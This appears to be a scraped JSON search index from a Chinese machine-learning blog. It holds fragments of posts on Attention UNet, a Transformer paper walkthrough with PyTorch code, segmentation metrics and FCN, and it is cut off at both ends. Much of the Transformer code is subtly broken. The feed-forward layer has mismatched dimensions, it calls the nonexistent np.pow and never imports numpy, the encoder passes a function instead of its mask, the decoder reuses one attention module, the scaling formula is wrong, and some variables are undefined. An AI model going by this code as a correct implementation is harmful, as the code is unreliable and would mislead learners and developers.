= Attention_block(F_g=512, F_l=512, F_int=256) self.Up_conv5 = conv_block(ch_in=1024, ch_out=512) self.Up4 = up_conv(ch_in=512, ch_out=256) self.Att4 = Attention_block(F_g=256, F_l=256, F_int=128) self.Up_conv4 = conv_block(ch_in=512, ch_out=256) self.Up3 = up_conv(ch_in=256, ch_out=128) self.Att3 = Attention_block(F_g=128, F_l=128, F_int=64) self.Up_conv3 = conv_block(ch_in=256, ch_out=128) self.Up2 = up_conv(ch_in=128, ch_out=64) self.Att2 = Attention_block(F_g=64, F_l=64, F_int=32) self.Up_conv2 = conv_block(ch_in=128, ch_out=64) self.Conv_1x1 = nn.Conv2d(64, output_ch, kernel_size=1, stride=1, padding=0) self.sigmoid = nn.Sigmoid() def forward(self, x): # encoding path x1 = self.Conv1(x) # [64,512,512]。[3,224,224]--\u003e[64,224,224] 只是通道数改变(self.Conv1改变)，形状不变 x2 = self.Maxpool(x1) # [64,256,256]。[64,224,224]--\u003e[64,112,112] 通道数不变，形状缩小一倍 x2 = self.Conv2(x2) # [128,256,256]。 [64,112,112]--\u003e[128,112,112] x3 = self.Maxpool(x2) # [128,128,128]。[128,112,112]--\u003e[128,56,56] x3 = self.Conv3(x3) # [256,128,128]。[128,56,56]--\u003e[256,56,56] x4 = self.Maxpool(x3) # [256,64,64]。[256,56,56]--\u003e[256,28,28] x4 = self.Conv4(x4) # [512,64,64]。[256,28,28]--\u003e[512,28,28] x5 = self.Maxpool(x4) # [512,32,32]。[512,28,28]--\u003e[512,14,14] x5 = self.Conv5(x5) # [1024,32,32]。[512,14,14]--\u003e[1024,14,14] # decoding + concat path d5 = self.Up5(x5) # [512,64,64]。[1024,14,14]--\u003e[512,28,28] 形状扩大2，且通道数增加 x4 = self.Att5(g=d5, x=x4) # d5是[512,64,64],x4是[512,64,64]。我这里d5是[512,28,28],x4是[512,28,28]---\u003e注意力机制之后输出x4也为[512,28,28] d5 = torch.cat((x4, d5), dim=1) # [1024,64,64]。x4为[512,28,28],d5为[512,28,28]---\u003e拼接之后为：[1024,28,28] d5 = self.Up_conv5(d5) # [512,64,64]。通道变为，形状不变[512,28,28] d4 = self.Up4(d5) # [256,128,128]。形状扩大2，且通道数变小：[256,56,56] x3 = self.Att4(g=d4, x=x3) # [256,128,128],[256,128,128]。[256,56,56],[256,56,56] d4 = torch.cat((x3, d4), dim=1) # [512,128,128]。拼接完用倒数变量：[512,56","date":"2022-10-10","objectID":"/attention-unet/:3:0","tags":["注意力机制","UNet"],"title":"Attention UNet","uri":"/attention-unet/"},{"categories":["AI"],"content":"参考 https://blog.csdn.net/weixin_41693877/article/details/108395270 https://blog.csdn.net/qq_31622015/article/details/90701328#commentBox https://blog.csdn.net/qq_43426908/article/details/123755654? ","date":"2022-10-10","objectID":"/attention-unet/:4:0","tags":["注意力机制","UNet"],"title":"Attention UNet","uri":"/attention-unet/"},{"categories":["AI"],"content":"简介 论文地址：https://arxiv.org/abs/1706.03762 该论文提出了Transformer模型，完全基于Attention mechanism，抛弃了传统的RNN和CNN，是第一个只依赖于自注意力来做encoder-decoder架构的模型，可谓是大道至简！ ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:1:0","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Transformer架构 先整体看一下架构图， 对于上图左边的Nx标注出来的部分，就是encoder的一层，一共有6层。同理右边的decoder也是。 输入序列经过word embedding和positional encoding相加后，输入到encoder。 输出序列经过word embedding和positional encoding相加后，输入到decoder。 最后，decoder输出的结果，经过一个线性层，然后计算softmax。 ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:2:0","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Encoder encoder由6层相同的层组成，每一层分别由两部分组成： 第一部分是一个multi-head self-attention mechanism 第二部分是一个position-wise feed-forward network，是一个全连接层 两个部分都有一个残差连接(residual connection)，然后接着一个Layer Normalization ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:2:1","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Decoder 和encoder类似，decoder由6个相同的层组成，每一个层包括以下3个部分： 第一个部分是multi-head self-attention mechanism 第二部分是multi-head context-attention mechanism 第三部分是一个position-wise feed-forward network 还是和encoder类似，上面三个部分的每一个部分，都有一个残差连接，后接一个Layer Normalization。 ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:2:2","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Attention机制 attention是指，对于某个时刻的输出y，它在输入x上各个部分的注意力。这个注意力实际上可以理解为权重。 attension机制有很多种，下面连接有一张较全面的表格：https://lilianweng.github.io/posts/2018-06-24-attention/ 上图中，第一种加性注意力(additive attention)在seq2seq模型里面用的很多，但是这里transformer中使用的另外一种乘性注意力(multiplicative attention)，即两个隐状态进行点积 ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:3:0","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Self-Attention 前面说attention机制的时候，都会说两个隐状态： $h_i$：输入序列第i个位置产生的隐状态 $s_t$：输出序列在第t个位置产生的隐状态 所谓self-attention实际上就是，输出序列就是输入序列！因此，计算自己的attention得分，就叫做self-attention！ ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:3:1","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Context-attention 它是encoder和decoder之间的attention。所以，你也可以称之为encoder-decoder attention。 不管是self-attention还是context-attention，它们计算attention分数的时候，可以选择很多方式，比如上面表中提到的： Transformer模型采用的是：scaled dot-product attention。 ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:3:2","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Scaled dot-product attention 通过确定Q和K之间的相似程度来选择V。 论文也提供了结构图： 其中，K和Q和V是一个东西，在之前复制了三份。 在encoder的self-attention中，Q、K、V都来自同一个地方（相等），他们是上一层encoder的输出。对于第一层encoder，它们就是word embedding和positional encoding相加得到的输入。 在decoder的self-attention中，Q、K、V都来自于同一个地方（相等），它们是上一层decoder的输出。对于第一层decoder，它们就是word embedding和positional encoding相加得到的输入。但是对于decoder，我们不希望它能获得下一个time step（即将来的信息），因此我们需要进行sequence masking。 在encoder-decoder attention中，Q来自于decoder的上一层的输出，K和V来自于encoder的输出，K和V是一样的。 Q、K、V三者的维度一样，即d_q=d_k=d_v Scaled dot-product attention的实现： import torch import torch.nn as nn class ScaledDotProductAttention(nn.Module): \"\"\"Scaled dot-product attention mechanism.\"\"\" def __init__(self, attention_dropout=0.0): super(ScaledDotProductAttention, self).__init__() self.dropout = nn.Dropout(attention_dropout) self.softmax = nn.Softmax(dim=2) def forward(self, q, k, v, scale=None, attn_mask=None): \"\"\"前向传播. Args: q: Queries张量，形状为[B, L_q, D_q] k: Keys张量，形状为[B, L_k, D_k] v: Values张量，形状为[B, L_v, D_v]，一般来说就是k scale: 缩放因子，一个浮点标量 attn_mask: Masking张量，形状为[B, L_q, L_k] Returns: 上下文张量和attetention张量 \"\"\" attention = torch.bmm(q, k.transpose(1, 2)) # bmm 是tensor乘法 # 相乘的两个矩阵，要满足一定的维度要求：input（p,m,n) * mat2(p,n,a) -\u003eoutput(p,m,a)。 # 这个要求，可以类比于矩阵相乘。前一个矩阵的\"列\"等于后面矩阵的\"行\"才可以相乘。 if scale: attention = attention * scale if attn_mask: # 给需要mask的地方设置一个负无穷 attention = attention.masked_fill_(attn_mask, -np.inf) # 用value填充tensor中与mask中值为1位置相对应的元素。np.inf 表示+∞ # 计算softmax attention = self.softmax(attention) # 添加dropout attention = self.dropout(attention) # 和V做点积 context = torch.bmm(attention, v) return context, attention ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:3:3","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Multi-head attention 将Q、K、V通过一个线性映射之后，分成h份，对每一份进行scaled dot-product attention效果更好。 然后，把各个部分的结果合并起来，再次经过线性映射，得到最终的输出。这就是所谓的multi-head attention。 上面的超参数h就是heads数量。论文默认是8。 multi-head attention结构图： Multi-head attention的实现： import torch import torch.nn as nn class MultiHeadAttention(nn.Module): def __init__(self, model_dim=512, num_heads=8, dropout=0.0): super(MultiHeadAttention, self).__init__() self.dim_per_head = model_dim // num_heads self.num_heads = num_heads self.linear_k = nn.Linear(model_dim, self.dim_per_head * num_heads) self.linear_v = nn.Linear(model_dim, self.dim_per_head * num_heads) self.linear_q = nn.Linear(model_dim, self.dim_per_head * num_heads) self.dot_product_attention = ScaledDotProductAttention(dropout) self.linear_final = nn.Linear(model_dim, model_dim) self.dropout = nn.Dropout(dropout) # multi-head attention之后需要做layer norm self.layer_norm = nn.LayerNorm(model_dim) def forward(self, key, value, query, attn_mask=None): # 残差连接 residual = query dim_per_head = self.dim_per_head num_heads = self.num_heads batch_size = key.size(0) # linear projection key = self.linear_k(key) value = self.linear_v(value) query = self.linear_q(query) # split by heads key = key.view(batch_size * num_heads, -1, dim_per_head) value = value.view(batch_size * num_heads, -1, dim_per_head) query = query.view(batch_size * num_heads, -1, dim_per_head) if attn_mask: attn_mask = attn_mask.repeat(num_heads, 1, 1) # scaled dot product attention scale = (key.size(-1) // num_heads) ** -0.5 context, attention = self.dot_product_attention(query, key, value, scale, attn_mask) # concat heads context = context.view(batch_size, -1, dim_per_head * num_heads) # final linear projection output = self.linear_final(context) # dropout output = self.dropout(output) # add residual and norm layer output = self.layer_norm(residual + output) return output, attention 其中 ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:3:4","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Residual connection $F(x) + x$，其中的+x就是一个shortcut 那么残差结构有什么好处呢？显而易见：因为增加了一项x，那么该层网络对x求偏导的时候，多了一个常数项1！所以在反向传播过程中，梯度连乘，也不会造成梯度消失！ # transformer架构图中的Add \u0026 Norm中的Add也就是指的这个shortcut。 def residual(sublayer_fn,x): return sublayer_fn(x)+x ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:3:5","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Layer Normalization Normalization有很多种，但是它们都有一个共同的目的，那就是把输入转化成均值为0方差为1的数据。 BN的主要思想就是：在每一层的每一批数据上进行归一化。BN的具体做法就是对每一小批数据，在批这个方向上做归一化 那么什么是Layer normalization呢？:它也是归一化数据的一种方式，不过LN是在每一个样本上计算均值和方差，而不是BN那种在批方向计算均值和方差！ PyTorch已经实现了LN的代码，如果想要自己实现可以看下面的代码： import torch import torch.nn as nn class LayerNorm(nn.Module): \"\"\"实现LayerNorm。其实PyTorch已经实现啦，见nn.LayerNorm。\"\"\" def __init__(self, features, epsilon=1e-6): \"\"\"Init. Args: features: 就是模型的维度。论文默认512 epsilon: 一个很小的数，防止数值计算的除0错误 \"\"\" super(LayerNorm, self).__init__() # alpha self.gamma = nn.Parameter(torch.ones(features)) # beta self.beta = nn.Parameter(torch.zeros(features)) self.epsilon = epsilon def forward(self, x): \"\"\"前向传播. Args: x: 输入序列张量，形状为[B, L, D] \"\"\" # 根据公式进行归一化 # 在X的最后一个维度求均值，最后一个维度就是模型的维度 mean = x.mean(-1, keepdim=True) # 在X的最后一个维度求方差，最后一个维度就是模型的维度 std = x.std(-1, keepdim=True) return self.gamma * (x - mean) / (std + self.epsilon) + self.beta ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:3:6","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Mask mask顾名思义就是掩码，在我们这里的意思大概就是对某些值进行掩盖，使其不产生效果。 在t实现不会看到t时间以及之后的输入，从而保证训练和预测的时候行为一致 Transformer模型里面涉及两种mask。分别是 padding mask：所有的scaled dot-product attention里面都需要用到 sequence mask：只有在decoder的self-attention里面用到 ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:4:0","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"padding mask 我们的每个批次输入序列长度是不一样的！也就是说，我们要对输入序列进行对齐！具体来说，就是给在较短的序列后面填充0。因为这些填充的位置，其实是没什么意义的，所以我们的attention机制不应该把注意力放在这些位置上，所以我们需要进行一些处理。 具体的做法是，把这些位置的值加上一个非常大的负数(可以是负无穷)，这样的话，经过softmax，这些位置的概率就会接近0！ def padding_mask(seq_k, seq_q): # seq_k和seq_q的形状都是[B,L] len_q = seq_q.size(1) # `PAD` is 0 pad_mask = seq_k.eq(0) pad_mask = pad_mask.unsqueeze(1).expand(-1, len_q, -1) # shape [B, L_q, L_k] return pad_mask ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:4:1","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"sequence mask sequence mask是为了使得decoder不能看见未来的信息。也就是对于一个序列，在time_step为t的时刻，我们的解码输出应该只能依赖于t时刻之前的输出，而不能依赖t之后的输出。因此我们需要想一个办法，把t之后的信息给隐藏起来。 那么具体怎么做呢？产生一个上三角矩阵，上三角的值全为1，下三角的值全为0，对角线也是0。把这个矩阵作用在每一个序列上，就可以达到我们的目的啦 def sequence_mask(seq): batch_size, seq_len = seq.size() mask = torch.triu(torch.ones((seq_len, seq_len), dtype=torch.uint8), diagonal=1) # 返回矩阵（2-D张量）或矩阵 input 批次的上三角部分，结果张量 out 的其他元素设置为0 mask = mask.unsqueeze(0).expand(batch_size, -1, -1) # [B, L, L] return mask attn_mask参数有几种情况？ 对于decoder的self-attention，里面使用到的scaled dot-product attention，同时需要padding mask和sequence mask作为attn_mask，具体实现就是两个mask相加作为attn_mask。 其他情况，attn_mask一律等于padding mask。 ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:4:2","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Position Encoding 对序列中的词语出现的位置进行编码。如果对位置进行编码，那么我们的模型就可以捕捉顺序信息 PE的代码实现，按照公式即可： import torch import torch.nn as nn class PositionalEncoding(nn.Module): def __init__(self, d_model, max_seq_len): \"\"\"初始化。 Args: d_model: 一个标量。模型的维度，论文默认是512 max_seq_len: 一个标量。文本序列的最大长度 \"\"\" super(PositionalEncoding, self).__init__() # 根据论文给的公式，构造出PE矩阵 position_encoding = np.array([ [pos / np.pow(10000, 2.0 * (j // 2) / d_model) for j in range(d_model)] for pos in range(max_seq_len)]) # 偶数列使用sin，奇数列使用cos position_encoding[:, 0::2] = np.sin(position_encoding[:, 0::2]) position_encoding[:, 1::2] = np.cos(position_encoding[:, 1::2]) # 在PE矩阵的第一行，加上一行全是0的向量，代表这`PAD`的positional encoding # 在word embedding中也经常会加上`UNK`，代表位置单词的word embedding，两者十分类似 # 那么为什么需要这个额外的PAD的编码呢？很简单，因为文本序列的长度不一，我们需要对齐， # 短的序列我们使用0在结尾补全，我们也需要这些补全位置的编码，也就是`PAD`对应的位置编码 pad_row = torch.zeros([1, d_model]) position_encoding = torch.cat((pad_row, position_encoding)) # 嵌入操作，+1是因为增加了`PAD`这个补全位置的编码， # Word embedding中如果词典增加`UNK`，我们也需要+1。看吧，两者十分相似 self.position_encoding = nn.Embedding(max_seq_len + 1, d_model) self.position_encoding.weight = nn.Parameter(position_encoding, requires_grad=False) def forward(self, input_len): \"\"\"神经网络的前向传播。 Args: input_len: 一个张量，形状为[BATCH_SIZE, 1]。每一个张量的值代表这一批文本序列中对应的长度。 Returns: 返回这一批序列的位置编码，进行了对齐。 \"\"\" # 找出这一批序列的最大长度 max_len = torch.max(input_len) tensor = torch.cuda.LongTensor if input_len.is_cuda else torch.LongTensor # 对每一个序列的位置进行对齐，在原序列位置的后面补上0 # 这里range从1开始也是因为要避开PAD(0)的位置 input_pos = tensor( [list(range(1, len + 1)) + [0] * (max_len - len) for len in input_len]) return self.position_encoding(input_pos) ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:5:0","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Word embedding 它实际上就是一个二维浮点矩阵，里面的权重是可训练参数，我们只需要把这个矩阵构建出来就完成了word embedding的工作。 import torch.nn as nn embedding = nn.Embedding(vocab_size, embedding_size, padding_idx=0) # 获得输入的词嵌入编码 seq_embedding = seq_embedding(inputs)*np.sqrt(d_model) # 上面vocab_size就是词典的大小，embedding_size就是词嵌入的维度大小，论文里面就是等于d_model=512 # 所以word embedding矩阵就是一个vocab_size*embedding_size的二维张量 ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:5:1","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Position-wise Feed-Forward network import torch import torch.nn as nn class PositionalWiseFeedForward(nn.Module): def __init__(self, model_dim=512, ffn_dim=2048, dropout=0.0): super(PositionalWiseFeedForward, self).__init__() self.w1 = nn.Conv1d(model_dim, ffn_dim, 1) self.w2 = nn.Conv1d(model_dim, ffn_dim, 1) self.dropout = nn.Dropout(dropout) self.layer_norm = nn.LayerNorm(model_dim) def forward(self, x): output = x.transpose(1, 2) output = self.w2(F.relu(self.w1(output))) output = self.dropout(output.transpose(1, 2)) # add residual and norm layer output = self.layer_norm(x + output) return output ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:6:0","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Transformer 至此，所有的细节都已经解释完了。现在来完成我们Transformer模型的代码。 首先，我们需要实现6层的encoder和decoder encoder: import torch import torch.nn as nn class EncoderLayer(nn.Module): \"\"\"Encoder的一层。\"\"\" def __init__(self, model_dim=512, num_heads=8, ffn_dim=2018, dropout=0.0): super(EncoderLayer, self).__init__() self.attention = MultiHeadAttention(model_dim, num_heads, dropout) self.feed_forward = PositionalWiseFeedForward(model_dim, ffn_dim, dropout) def forward(self, inputs, attn_mask=None): # self attention context, attention = self.attention(inputs, inputs, inputs, padding_mask) # feed forward network output = self.feed_forward(context) return output, attention class Encoder(nn.Module): \"\"\"多层EncoderLayer组成Encoder。\"\"\" def __init__(self, vocab_size, max_seq_len, num_layers=6, model_dim=512, num_heads=8, ffn_dim=2048, dropout=0.0): super(Encoder, self).__init__() self.encoder_layers = nn.ModuleList( [EncoderLayer(model_dim, num_heads, ffn_dim, dropout) for _ in range(num_layers)]) self.seq_embedding = nn.Embedding(vocab_size + 1, model_dim, padding_idx=0) self.pos_embedding = PositionalEncoding(model_dim, max_seq_len) def forward(self, inputs, inputs_len): output = self.seq_embedding(inputs) output += self.pos_embedding(inputs_len) self_attention_mask = padding_mask(inputs, inputs) attentions = [] for encoder in self.encoder_layers: output, attention = encoder(output, self_attention_mask) attentions.append(attention) return output, attentions decoder: import torch import torch.nn as nn class DecoderLayer(nn.Module): def __init__(self, model_dim, num_heads=8, ffn_dim=2048, dropout=0.0): super(DecoderLayer, self).__init__() self.attention = MultiHeadAttention(model_dim, num_heads, dropout) self.feed_forward = PositionalWiseFeedForward(model_dim, ffn_dim, dropout) def forward(self, dec_inputs, enc_outputs, self_attn_mask=None, context_attn_mask=None): # self attention, all inputs are decoder inputs dec_output, self_attention = self.attention( dec_inputs, dec_inputs, dec_inputs, self_attn_mask) # context attention # query is decoder's outputs, key and value are encoder's inputs dec_output, context_attention = self.attention( enc_outputs, enc_outputs, dec_output, context_attn_mask) # decoder's output, or context dec_output = self.feed_forward(dec_output) return dec_output, self_attention, context_attention class Decoder(nn.Module): def __init__(self, vocab_size, max_seq_len, num_layers=6, model_dim=512, num_heads=8, ffn_dim=2048, dropout=0.0): super(Decoder, self).__init__() self.num_layers = num_layers self.decoder_layers = nn.ModuleList( [DecoderLayer(model_dim, num_heads, ffn_dim, dropout) for _ in range(num_layers)]) self.seq_embedding = nn.Embedding(vocab_size + 1, model_dim, padding_idx=0) self.pos_embedding = PositionalEncoding(model_dim, max_seq_len) def forward(self, inputs, inputs_len, enc_output, context_attn_mask=None): output = self.seq_embedding(inputs) output += self.pos_embedding(inputs_len) self_attention_padding_mask = padding_mask(inputs, inputs) seq_mask = sequence_mask(inputs) self_attn_mask = torch.gt((self_attention_padding_mask + seq_mask), 0) self_attentions = [] context_attentions = [] for decoder in self.decoder_layers: output, self_attn, context_attn = decoder( output, enc_output, self_attn_mask, context_attn_mask) self_attentions.append(self_attn) context_attentions.append(context_attn) return output, self_attentions, context_attentions 最后，我们把encoder和decoder组成Transformer模型！ import torch import torch.nn as nn class Transformer(nn.Module): def __init__(self, src_vocab_size, src_max_len, tgt_vocab_size, tgt_max_len, num_layers=6, model_dim=512, num_heads=8, ffn_dim=2048, dropout=0.2): super(Transformer, self).__init__() self.encoder = Encoder(src_vocab_size, src_max_len, num_layers, model_dim, num_heads, ffn_dim, dropout) self.decoder = Decoder(tgt_vocab_size, tgt_max_len, num_layers, model_dim, num_heads, ffn_dim, dropout) self.linear = nn.Linear(model_dim, tgt_vocab_size, bias=False) self.softmax = nn.Softmax(dim=2) def forward(se","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:7:0","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"Note self-attention有很多变形，以后的重点就是如何减少运算量 ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:8:0","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"参考链接 感谢这篇文章的大佬：https://www.jianshu.com/p/3b550e903e78 ","date":"2022-10-09","objectID":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/:9:0","tags":["attention","transformer","注意力机制"],"title":"Attention Is All You Need论文及代码","uri":"/attention-is-all-you-need%E8%AE%BA%E6%96%87%E5%8F%8A%E4%BB%A3%E7%A0%81/"},{"categories":["AI"],"content":"常见语义分割评价指标 ","date":"2022-10-03","objectID":"/%E5%B8%B8%E8%A7%81%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2%E8%AF%84%E4%BB%B7%E6%8C%87%E6%A0%87/:1:0","tags":["语义分割","mean IOU"],"title":"常见语义分割评价指标","uri":"/%E5%B8%B8%E8%A7%81%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2%E8%AF%84%E4%BB%B7%E6%8C%87%E6%A0%87/"},{"categories":["AI"],"content":"Pixel Accuracy/global accuary 分子是所有预测正确像素总和，分母是所有的像素 例子： 预测正确是用绿色表示，预测错误的用红色表示。 那对于预测0来说，就是：绿色的0/(红色的0+绿色的0) 对预测为1的：正确的为绿色，错误的为红色 预测2 预测3 预测4 最后得到的混淆矩阵： 代码： ","date":"2022-10-03","objectID":"/%E5%B8%B8%E8%A7%81%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2%E8%AF%84%E4%BB%B7%E6%8C%87%E6%A0%87/:1:1","tags":["语义分割","mean IOU"],"title":"常见语义分割评价指标","uri":"/%E5%B8%B8%E8%A7%81%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2%E8%AF%84%E4%BB%B7%E6%8C%87%E6%A0%87/"},{"categories":["AI"],"content":"mean Accuracy 每个类别的accuracy计算出来，然后求平均 计算 用上图的每个类别计算出来，取平均即可 代码： ","date":"2022-10-03","objectID":"/%E5%B8%B8%E8%A7%81%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2%E8%AF%84%E4%BB%B7%E6%8C%87%E6%A0%87/:1:2","tags":["语义分割","mean IOU"],"title":"常见语义分割评价指标","uri":"/%E5%B8%B8%E8%A7%81%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2%E8%AF%84%E4%BB%B7%E6%8C%87%E6%A0%87/"},{"categories":["AI"],"content":"mean IoU ☆ 每个类别的IOU，然后求平均 这里的IOU的计算和目标检测中的IOU是类似的(交集比上并集) 计算 分子：每个类别预测正确的像素个数 分母：真实标签像素个数 + 预测为这个类别的像素的个数-分子 如上图例子，将这个5个类别的IoU分别求出来，取平均就可 代码： ","date":"2022-10-03","objectID":"/%E5%B8%B8%E8%A7%81%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2%E8%AF%84%E4%BB%B7%E6%8C%87%E6%A0%87/:1:3","tags":["语义分割","mean IOU"],"title":"常见语义分割评价指标","uri":"/%E5%B8%B8%E8%A7%81%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2%E8%AF%84%E4%BB%B7%E6%8C%87%E6%A0%87/"},{"categories":["AI"],"content":"参考 来自B站霹雳吧啦Wz ","date":"2022-10-03","objectID":"/%E5%B8%B8%E8%A7%81%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2%E8%AF%84%E4%BB%B7%E6%8C%87%E6%A0%87/:2:0","tags":["语义分割","mean IOU"],"title":"常见语义分割评价指标","uri":"/%E5%B8%B8%E8%A7%81%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2%E8%AF%84%E4%BB%B7%E6%8C%87%E6%A0%87/"},{"categories":["AI"],"content":"FCN(全卷积神经网络, Fully Convolutional Networks for Semantic Segmentation) 首个端对端的针对像素级预测的全卷积网络 论文地址：论文：https://arxiv.org/abs/1411.4038 FCN是图像语义分割的开山之作，这是一篇发表在2015 CVPR上的一篇论文，拿到了当年的best paper honorable mention。 传统的CNN分类网络，只能标识整个图片的类别，不能标识每个像素点的类别 ","date":"2022-10-03","objectID":"/fcn%E5%AD%A6%E4%B9%A0/:1:0","tags":["语义分割","FCN","全卷积神经网络"],"title":"FCN学习","uri":"/fcn%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"语义分割 常见的分类任务： ● 语义分割：对像素进行分类。经典网络有FCN ● 实例分割：不同实例也用不同颜色。经典网络有Mask R-CNN ● 